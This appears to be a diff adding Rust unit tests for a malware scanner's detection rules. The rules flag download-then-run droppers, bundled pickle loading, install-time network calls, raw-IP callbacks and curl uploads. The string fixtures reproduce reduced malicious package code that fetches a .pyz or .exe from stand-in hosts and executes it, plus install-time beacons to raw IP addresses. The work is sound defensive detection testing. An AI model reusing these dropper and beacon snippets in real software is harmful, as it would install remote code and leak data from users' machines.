@@ -3049,3 +3049,295 @@ mod agent_instruction_tests {
         );
     }
 }
+
+// ---------------------------------------------------------------------------
+// Reconciliation (docs/detection/fp-calibration.md, "Reconciliation")
+//
+// The rules and correlation chains added to recover recall after the verdict
+// recalibration, without re-grading routine idioms. Each new line rule is a
+// Low observation or a Medium "suspicious in context" finding; the attack
+// shape is carried by a chain (download then run, bundled pickle then load)
+// or by the install/import-time file it sits in. The malicious halves are
+// reduced from the Datadog npm/PyPI samples named in the doc; the benign
+// halves are the idioms the rules must leave alone (NVIDIA skills load user
+// checkpoints with weights_only=False; an unpacked download is not a run;
+// private and documentation IP ranges).
+// This file is listed in `.sigilignore` (detection-engine fixtures).
+// ---------------------------------------------------------------------------
+#[cfg(test)]
+mod reconcile {
+    use super::scan_file_with_packs;
+    use crate::corpus::loader::load_all_packs;
+    use crate::scanner::{Finding, Severity};
+
+    fn scan(filename: &str, contents: &str) -> Vec<Finding> {
+        let packs = load_all_packs().expect("embedded packs must parse");
+        let base = filename.rsplit('/').next().unwrap_or(filename);
+        scan_file_with_packs(&packs, filename, base, contents)
+    }
+
+    fn severities(filename: &str, contents: &str, rule: &str) -> Vec<Severity> {
+        scan(filename, contents)
+            .into_iter()
+            .filter(|f| f.rule == rule)
+            .map(|f| f.severity)
+            .collect()
+    }
+
+    fn fires(filename: &str, contents: &str, rule: &str) -> bool {
+        !severities(filename, contents, rule).is_empty()
+    }
+
+    /// Line findings plus the correlation chains over them, as the scanner
+    /// computes them for one file.
+    fn chains(filename: &str, contents: &str) -> Vec<Finding> {
+        let findings = scan(filename, contents);
+        let lines: Vec<&str> = contents.lines().collect();
+        crate::scanner::correlate::apply(
+            &crate::corpus::compiled::corpus().correlation_rules,
+            &findings,
+            &lines,
+        )
+    }
+
+    fn chained(filename: &str, contents: &str, rule: &str) -> Option<Severity> {
+        chains(filename, contents)
+            .into_iter()
+            .find(|f| f.rule == rule)
+            .map(|f| f.severity)
+    }
+
+    // -- download then run (DROPPER-CHAIN-001) -----------------------------
+
+    /// guardrails-ai 0.10.1 (compromised release), guardrails/__init__.py:
+    /// at import, a .pyz from a look-alike domain is written to /tmp and run.
+    const GUARDRAILS: &str = "import urllib.request\n\
+        import subprocess\n\
+        URL = \"https://git-tanstack.example/transformers.pyz\"\n\
+        PATH = \"/tmp/transformers.pyz\"\n\
+        req = urllib.request.Request(URL, headers={'User-Agent': 'Mozilla/5.0'})\n\
+        with urllib.request.urlopen(req) as response, open(PATH, 'wb') as out_file:\n\
+        \x20   out_file.write(response.read())\n\
+        \n\
+        subprocess.run([\"python3\", PATH])\n";
+
+    /// antibyfron / artindex / automsg 0.0.1: a curl.exe download of an .exe
+    /// built as a string, then Start-Process on the same path.
+    const PS_DROPPER: &str = "output_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\
+        download_command = f'curl.exe -L https://github.com/example/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\
+        download_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True)\n\
+        if download_result.returncode == 0:\n\
+        \x20   execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n\
+        \x20   execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True)\n";
+
+    #[test]
+    fn dropper_chain_links_a_download_to_the_run_of_its_file() {
+        assert!(fires("pkg/__init__.py", GUARDRAILS, "CODE-RUNFILE-001"));
+        assert_eq!(
+            chained("pkg/__init__.py", GUARDRAILS, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+        assert_eq!(
+            severities("pkg/__init__.py", PS_DROPPER, "NET-EXE-001"),
+            vec![Severity::Medium]
+        );
+        assert_eq!(
+            chained("pkg/__init__.py", PS_DROPPER, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+    }
+
+    /// durabletask 1.4.1 (compromised release), durabletask/__init__.py: the
+    /// path travels as a literal, not a variable.
+    const DURABLETASK: &str = "if platform.system() == \"Linux\":\n\
+        \x20   try:\n\
+        \x20       urllib.request.urlretrieve(\"https://check.git-service.example/rope.pyz\", \"/tmp/managed.pyz\")\n\
+        \x20       with open(os.devnull, 'w') as f:\n\
+        \x20           subprocess.Popen([\"python3\", \"/tmp/managed.pyz\"], stdout=f, stderr=f, start_new_session=True)\n\
+        \x20   except:\n\
+        \x20       pass\n";
+
+    #[test]
+    fn dropper_chain_follows_a_literal_path() {
+        assert!(fires("pkg/__init__.py", DURABLETASK, "NET-002"));
+        assert_eq!(
+            chained("pkg/__init__.py", DURABLETASK, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+        let elsewhere = DURABLETASK.replace(
+            "[\"python3\", \"/tmp/managed.pyz\"]",
+            "[\"python3\", \"/opt/tool/run.py\"]",
+        );
+        assert_eq!(chained("x.py", &elsewhere, "DROPPER-CHAIN-001"), None);
+    }
+
+    #[test]
+    fn dropper_chain_needs_the_same_file_to_be_run() {
+        // A download written to one path and an unrelated script run.
+        let unrelated = GUARDRAILS.replace(
+            "subprocess.run([\"python3\", PATH])",
+            "subprocess.run([\"python3\", SETUP_SCRIPT])",
+        );
+        assert_eq!(chained("x.py", &unrelated, "DROPPER-CHAIN-001"), None);
+        // The downloaded archive is unpacked, not run: `tar` is not an
+        // interpreter, so the launch observation does not fire at all.
+        let unpack = GUARDRAILS.replace(
+            "subprocess.run([\"python3\", PATH])",
+            "subprocess.run([\"tar\", \"-xzf\", PATH])",
+        );
+        assert!(!fires("x.py", &unpack, "CODE-RUNFILE-001"));
+        assert_eq!(chained("x.py", &unpack, "DROPPER-CHAIN-001"), None);
+        // A command string passed to an interpreter (-c / -Command) runs the
+        // string, not a file, and is not the launch shape.
+        assert!(!fires(
+            "x.py",
+            "subprocess.run([\"bash\", \"-c\", download_command])",
+            "CODE-RUNFILE-001"
+        ));
+    }
+
+    #[test]
+    fn launch_and_download_observations_stay_low_or_medium() {
+        for launch in [
+            "subprocess.run([sys.executable, script_path, \"--check\"])",
+            "subprocess.Popen([\"node\", entry])",
+            "os.startfile(installer)",
+            "Start-Process -FilePath $setup -Wait",
+            "  bash \"$TMP_SCRIPT\"",
+        ] {
+            assert_eq!(
+                severities("run.py", launch, "CODE-RUNFILE-001"),
+                vec![Severity::Low],
+                "{launch}"
+            );
+        }
+        // A quoted variable after `||` is a default value, not a command
+        // (meme-pumper's content-generator.ts).
+        assert!(!fires(
+            "content-generator.ts",
+            "const tokenSymbol = options.token || '$MEME';",
+            "CODE-RUNFILE-001"
+        ));
+        // An installer URL that is not a Windows program is not NET-EXE-001.
+        assert!(!fires(
+            "setup.sh",
+            "curl -fsSL https://example.com/tool-linux-amd64.tar.gz -o tool.tgz",
+            "NET-EXE-001"
+        ));
+        assert!(fires(
+            "install.ps1",
+            "Invoke-WebRequest -Uri https://example.net/payload.exe -OutFile $env:TEMP\\p.exe",
+            "NET-EXE-001"
+        ));
+    }
+
+    // -- bundled pickle deserialized (DESER-CHAIN-001) ---------------------
+
+    /// ai-labs-snippets-sdk 0.1.0, src/ai_labs_snippets_sdk/__init__.py.
+    const BUNDLED_MODEL: &str = "import os\n\
+        import torch\n\
+        model_path = os.path.join(os.path.dirname(__file__), \"model.pt\")\n\
+        try:\n\
+        \x20   model = torch.load(model_path, map_location='cpu', weights_only=False)\n\
+        \x20   model.eval()\n\
+        except Exception as e:\n\
+        \x20   raise RuntimeError(f\"Failed to load model: {e}\") from e\n";
+
+    #[test]
+    fn deser_chain_bundled_pickle_is_high() {
+        assert_eq!(
+            severities("pkg/__init__.py", BUNDLED_MODEL, "CODE-MODEL-001"),
+            vec![Severity::Low]
+        );
+        assert_eq!(
+            severities("pkg/__init__.py", BUNDLED_MODEL, "CODE-DESER-001"),
+            vec![Severity::Low]
+        );
+        assert_eq!(
+            chained("pkg/__init__.py", BUNDLED_MODEL, "DESER-CHAIN-001"),
+            Some(Severity::High)
+        );
+    }
+
+    #[test]
+    fn user_checkpoint_load_is_only_an_observation() {
+        // NVIDIA earth2studio / tao skills load the user's own checkpoint.
+        let user = "core_model = torch.load(model_path, map_location=\"cpu\", weights_only=False)";
+        assert_eq!(
+            severities("diagnostic.py", user, "CODE-DESER-001"),
+            vec![Severity::Low]
+        );
+        assert!(chains("diagnostic.py", user).is_empty());
+        // A bundled JSON table is not a pickle.
+        let table = "path = os.path.join(os.path.dirname(__file__), \"data.json\")";
+        assert!(!fires("pkg/__init__.py", table, "CODE-MODEL-001"));
+    }
+
+    // -- install- and import-time network ----------------------------------
+
+    #[test]
+    fn install_time_network_request_is_medium_in_setup_py_only() {
+        let beacon = "        urllib.request.urlopen(urllib.request.Request(";
+        assert_eq!(
+            severities("setup.py", beacon, "INSTALL-NET-001"),
+            vec![Severity::Medium]
+        );
+        assert!(!fires("client.py", beacon, "INSTALL-NET-001"));
+        let fetch = "    requests.get(\"https://example.com/lib.tar.gz\", timeout=30)";
+        assert!(fires("setup.py", fetch, "INSTALL-NET-001"));
+    }
+
+    #[test]
+    fn raw_ip_urls() {
+        // airio 9.9.9 setup.py, anduril-sdk 1.0.1 __init__.py, and a
+        // package.json dependency spec pointing at an address (1inch-p2p-sdk).
+        let setup = "            \"http://69.164.221.216:8080/callback\",json.dumps(d).encode(),";
+        assert_eq!(
+            severities("setup.py", setup, "INSTALL-RAWIP-001"),
+            vec![Severity::High]
+        );
+        assert_eq!(
+            severities("setup.py", setup, "NET-RAWIP-001"),
+            vec![Severity::Medium]
+        );
+        let init = "            \"http://76.13.5.140:8444/api/depconfusion\",";
+        assert!(fires("anduril_sdk/__init__.py", init, "INSTALL-RAWIP-001"));
+        let dep = "    \"chai\": \"http://54.173.15.59:8080/npm/1inch-p2p-sdk\",";
+        assert!(fires("package.json", dep, "INSTALL-RAWIP-001"));
+        // Elsewhere in a package the address is Medium, not High.
+        assert!(!fires("client.py", init, "INSTALL-RAWIP-001"));
+        assert!(fires("client.py", init, "NET-RAWIP-001"));
+        // Loopback, private, link-local, documentation ranges and public
+        // resolvers are not reported; neither is a version string.
+        for benign in [
+            "BASE = \"http://127.0.0.1:8080/\"",
+            "BASE = \"http://10.0.0.5:9000/api\"",
+            "BASE = \"http://192.168.1.10/\"",
+            "BASE = \"http://172.20.0.2:5432\"",
+            "EXAMPLE = \"https://203.0.113.7/login\"",
+            "DOH = \"https://1.1.1.1/dns-query\"",
+            "\"version\": \"1.2.3.4\",",
+        ] {
+            assert!(!fires("setup.py", benign, "NET-RAWIP-001"), "{benign}");
+            assert!(!fires("setup.py", benign, "INSTALL-RAWIP-001"), "{benign}");
+        }
+    }
+
+    // -- uploads -----------------------------------------------------------
+
+    #[test]
+    fn curl_upload_is_an_observation() {
+        let deploy = r#"RESPONSE=$(curl -s -X POST "$DEPLOY_ENDPOINT" -F "file=@$TARBALL" -F "framework=$FRAMEWORK")"#;
+        assert_eq!(
+            severities("deploy.sh", deploy, "NET-UPLOAD-001"),
+            vec![Severity::Low]
+        );
+        assert!(fires(
+            "ci.sh",
+            "curl --data-binary @report.json https://ci.example.com/upload",
+            "NET-UPLOAD-001"
+        ));
+        let message = "curl -F 'content=build finished' \"$WEBHOOK_URL\"";
+        assert!(!fires("notify.sh", message, "NET-UPLOAD-001"));
+    }
+}
